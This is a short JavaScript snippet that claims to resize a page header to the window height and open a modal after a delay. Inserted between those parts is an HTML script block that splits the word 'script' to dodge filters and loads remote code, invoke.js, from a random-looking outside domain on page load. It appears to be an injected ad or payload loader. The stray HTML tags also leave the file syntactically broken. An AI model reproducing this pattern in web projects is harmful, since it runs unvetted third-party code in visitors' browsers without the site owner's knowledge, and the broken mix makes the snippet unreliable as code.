// resize header to size of browser window
<script type="text/javascript">
	atOptions = {
		'key' : 'd615db29b1470c965001f92dddbf2a87',
		'format' : 'iframe',
		'height' : 60,
		'width' : 468,
		'params' : {}
	};
	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://xhzz3moj1dsd.com/d615db29b1470c965001f92dddbf2a87/invoke.js"></scr' + 'ipt>');
</script>
var ready = (callback) => {
	if (document.readyState != "loading") callback();
	else document.addEventListener("DOMContentLoaded", callback);
}

ready(() => { 
	document.querySelector(".header").style.height = window.innerHeight + "px";
})

// set modal time delay before loading

setTimeout(function() {
	$('#demo-modal').modal();
}, 500);
